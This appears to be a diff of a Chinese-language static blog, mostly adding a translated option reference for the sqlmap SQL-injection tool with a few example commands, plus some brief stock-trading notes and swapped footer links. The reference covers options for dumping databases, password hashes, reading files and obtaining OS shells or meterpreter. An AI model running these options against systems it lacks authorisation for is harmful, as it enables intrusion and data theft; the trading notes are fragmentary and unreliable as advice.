+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Options（选项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--version 显示程序的版本号并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-h, --help 显示此帮助消息并退出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-v VERBOSE 详细级别：0-6（默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		保存进度继续跑：
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
+<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Target（目标）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	以下至少需要设置其中一个选项，设置目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-d DIRECT 直接连接到数据库。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-u URL, --url=URL 目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-l LIST 从Burp或WebScarab代理的日志中解析目标。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-r REQUESTFILE 从一个文件中载入HTTP请求。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-c CONFIGFILE 从INI配置文件中加载选项。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Request（请求）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定如何连接到目标URL。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--data=DATA 通过POST发送的数据字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie=COOKIE HTTP Cookie头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cookie-urlencode URL 编码生成的cookie注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--drop-set-cookie 忽略响应的Set - Cookie头信息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--user-agent=AGENT 指定 HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--random-agent 使用随机选定的HTTP User - Agent头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--referer=REFERER 指定 HTTP Referer头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--headers=HEADERS 换行分开，加入其他的HTTP头
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy=PROXY 使用HTTP代理连接到目标URL
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--ignore-proxy 忽略系统默认的HTTP代理
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--retries=RETRIES 连接超时后重新连接的时间（默认3）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-url=SAFURL 在测试过程中经常访问的url地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Enumeration（枚举）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
+您自己的SQL语句。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-b, --banner 检索数据库管理系统的标识
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-user 检索数据库管理系统当前用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--current-db 检索数据库管理系统当前数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--is-dba 检测DBMS当前用户是否DBA
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--users 枚举数据库管理系统用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--passwords 枚举数据库管理系统用户密码哈希
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--privileges 枚举数据库管理系统用户的权限
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--roles 枚举数据库管理系统用户的角色
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbs 枚举数据库管理系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-D DBname 要进行枚举的指定数据库名
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tables 枚举的DBMS数据库中的表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--columns 枚举DBMS数据库表列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump 转储数据库管理系统的数据库中的表项
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dump-all 转储所有的DBMS数据库表中的条目
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--search 搜索列（S），表（S）和/或数据库名称（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-C COL 要进行枚举的数据库列
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-U USER 用来进行枚举的数据库用户
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--exclude-sysdbs 枚举表时排除系统数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--start=LIMITSTART 第一个查询输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--stop=LIMITSTOP 最后查询的输出进入检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--first=FIRSTCHAR 第一个查询输出字的字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--last=LASTCHAR 最后查询的输出字字符检索
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-query=QUERY 要执行的SQL语句
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--sql-shell 提示交互式SQL的shell
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Optimization（优化）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于优化SqlMap的性能。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-o 开启所有优化开关
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--predict-output 预测常见的查询输出
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--keep-alive 使用持久的HTTP（S）连接
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--null-connection 从没有实际的HTTP响应体中检索页面长度
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Injection（注入）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-p TESTPARAMETER 可测试的参数（S）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--dbms=DBMS 强制后端的DBMS为此值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os=OS 强制后端的DBMS操作系统为这个值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--prefix=PREFIX 注入payload字符串前缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--suffix=SUFFIX 注入payload字符串后缀
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Detection（检测）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--level=LEVEL 执行测试的等级（1-5，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--risk=RISK 执行测试的风险（0-3，默认为1）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--string=STRING 查询时有效时在页面匹配字符串
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--text-only 仅基于在文本内容比较网页
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Techniques（技巧）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可用于调整具体的SQL注入测试。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--technique=TECH SQL注入技术测试（默认BEUST）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-cols=UCOLS 定列范围用于测试UNION查询注入
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--union-char=UCHAR 用于暴力猜解列数的字符
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Fingerprint（指纹）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-f, --fingerprint 执行检查广泛的DBMS版本指纹
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Brute force（蛮力）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来运行蛮力检查。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-tables 检查存在共同表
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--common-columns 检查存在共同列
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	User-defined function injection（用户自定义函数注入）：<br />
+这些选项可以用来创建用户自定义函数。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--udf-inject 注入用户自定义函数<br />
+--shared-lib=SHLIB 共享库的本地路径
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	File system access（访问文件系统）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Operating system access（操作系统访问）：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用于访问后端数据库管理系统的底层操作系统。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-cmd=OSCMD 执行操作系统命令
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-shell 交互式的操作系统的shell
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-pwn 获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--os-bof 存储过程缓冲区溢出利用
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--priv-esc 数据库进程用户权限提升
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--msf-path=MSFPATH Metasploit Framework本地的安装路径
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Windows注册表访问：
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以被用来访问后端数据库管理系统Windows注册表。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-read 读一个Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-add 写一个Windows注册表项值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-del 删除Windows注册表键值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-key=REGKEY Windows注册表键
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-value=REGVAL Windows注册表项值
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-data=REGDATA Windows注册表键值数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--reg-type=REGTYPE Windows注册表项值类型
+	</li>
+</ul>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	这些选项可以用来设置一些一般的工作参数。
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--flush-session 刷新当前目标的会话文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--fresh-queries 忽略在会话文件中存储的查询结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--eta 显示每个输出的预计到达时间
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--update 更新SqlMap
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--save file保存选项到INI配置文件
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--batch 从不询问用户输入，使用所有默认配置。
+	</li>
+</ul>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	Miscellaneous（杂项）：
+</h3>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--beep 发现SQL注入时提醒
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--check-payload IDS对注入payloads的检测测试
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--cleanup SqlMap具体的UDF和表清理DBMS
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--forms 对目标URL的解析和测试形式
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--page-rank Google dork结果显示网页排名（PR）
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--parse-errors 从响应页面解析数据库管理系统的错误消息
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--replicate 复制转储的数据到一个sqlite3数据库
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		--wizard 给初级用户的简单向导界面
+	</li>
+</ul>
+
+<p>
+	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
+</p>
+<p>
+	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
+</p>
+
+
+
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
 
         </div>
     
@@ -1170,8 +1440,8 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/python-interview/">
-                Golang 深浅
+            <a href="/2026/09/19/stock/">
+                股市币市
             </a>
         </h1>
         <div class="post-info">
@@ -1181,7 +1451,7 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
             
             
                 <span class="category">
-                    <a href="/categories/后端/">后端</a>
+                    <a href="/categories/新/">新</a>
                 </span>
             
         </div>
@@ -1189,86 +1459,25 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
 
     
         <div class="content">
-            <!-- * [基础](#1)
-    * [进程、线程、Goroutine(协程)区别](#1.1)
-    * [make和new区别](#1.2)
-    * [数组和切片区别](#1.3)
-* [GMP协程调度器](#2)
-    * [调度器策略](#2.1)
-    * [调度器的生命周期](#2.2)
-* [并发 sync](#3)
-    * [通道 - channel](#3.1)
-    * [互斥锁 Mutex 与 读写锁 RWMutex 区别](#3.2)
-    * [并发Map - sync.Map](#3.3)
-    * [线程池 - sync.Pool](#3.4)
-* [内存](#4)
-    * [CG](#4.1)
-* [微服务之间通信方式 rpc Grpc http](#4) -->
-
-<h1 id="打包-pyinstalller"><a href="#打包-pyinstalller" class="headerlink" title="打包 pyinstalller"></a>打包 pyinstalller</h1><h2 id="单个文件打包"><a href="#单个文件打包" class="headerlink" title="单个文件打包"></a>单个文件打包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令</span></span><br><span class="line">pyinstaller -F xxx.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.去生成的dist文件夹找xxx.exe运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.运行成功，xxx.exe则为可执行文件，删除其它文件</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="打包多文件"><a href="#打包多文件" class="headerlink" title="打包多文件"></a>打包多文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.执行命令，xxx.py为程序入口文件</span></span><br><span class="line">pyinstall -D xxx.py </span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.删除生成的bulid和dist文件夹,仅保留xxx.spec文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.修改xxx.spec文件,详见2.2.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.执行命令</span></span><br><span class="line">pyinstaller -F xxx.spec</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.去dist文件夹下找xxx.exe文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6.运行成功，删除临时文件目录build；dist目录为打包的结果，可执行文件和其它程序运行的关联文件都在这个目录</span></span><br></pre></td></tr></table></figure>
-
-
-<p>conda 和 venv 差不多</p>
-<p>1️⃣ venv（Python 自带虚拟环境）</p>
-<pre><code>作用：创建一个 隔离的 Python 环境，不影响系统 Python。
-
-仅管理 Python 包，不管底层 C 库或系统库。
+            <p>本金 </p>
+<p>三折最多</p>
+<p>三折以上就是突发状况</p>
+<p>有信心可以all in 30%</p>
+<pre><code>信心一般可以先 20%
 </code></pre>
-<p>2️⃣ conda（跨语言包 + 环境管理器）</p>
-<pre><code>作用：创建隔离环境 + 安装包 + 管理底层依赖
+<p>小试牛刀 10% </p>
+<pre><code>补刀 10%
 
-不仅支持 Python，还支持 R、C/C++ 库。
+    收回本金 cl 1
+    或者收回补刀的钱 cl 2
+
+开始做空
 </code></pre>
+<p>一定要留补仓 40%</p>
+<p>本金越大 补仓率就要增高</p>
+<p>2&#x2F;24</p>
+<p>2684 200</p>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/19/raspberry-pi/">
-                Raspberry Pi 树莓派
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-19</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/单片机/">单片机</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>树莓派的开发探索-基本篇 环境基于(Raspberry Pi OS)</p>
-<h2 id="单片机开发与探索"><a href="#单片机开发与探索" class="headerlink" title="单片机开发与探索"></a>单片机开发与探索</h2><h3 id="无需显示器连WIFI"><a href="#无需显示器连WIFI" class="headerlink" title="无需显示器连WIFI"></a>无需显示器连WIFI</h3><blockquote>
-<p>树莓派系统连接原理</p>
-<blockquote>
-<p>用户可以在未启动树莓派的状态下单独修改 <code>/boot/wpa_supplicant.conf</code> 文件配置 WiFi 的 SSID 和密码，这样树莓派启动后会自行读取 <code>wpa_supplicant.conf</code> 配置文件连接 WiFi 设备。</p>
-</blockquote>
-</blockquote>
-<ul>
-<li><p>制作树莓派系统(Raspberry Pi OS)在sd里面不多赘述</p>
-</li>
-<li><p>在电脑中打开sd卡根目录创建名字为wpa_supplicant.conf 的文件</p>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=<span class="string">&quot;12345678&quot;</span></span><br><span class="line">	psk=<span class="string">&quot;88888888&quot;</span></span><br><span class="line">	key_mgmt=WPA-PSK</span><br><span class="line">	priority=1  <span class="comment"># 连接优先级，数字越大优先级越高（不可以是负数）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>开机启动树莓派即可连接WIFI</li>
-</ul>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
         </div>
     
 
@@ -1316,6 +1525,10 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
         <ul>
             
             <li>
+                <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-wireshark/">[expanded] [blog] Wiresha</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">[expanded] [blog] XSS跨站脚本</a>
             </li>
             
@@ -1325,10 +1538,6 @@ _by claude-sonnet-5 nightly expand · 2026-09-19_
             
             <li>
                 <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-cloudfront-distribution-%E8%B7%A8%E8%B4%A6%E5%8F%B7%E8%BF%81%E7%A7%BB%E6%9C%80%E5%AE%B9%E6%98%93%E8%B8%A9%E7%9A%84%E5%9D%91/">[expanded] CloudFront dis</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2026/09/19/2026-09-19-expanded-blog-linux%E5%91%BD%E4%BB%A4/">[expanded] [blog] Linux命令</a>
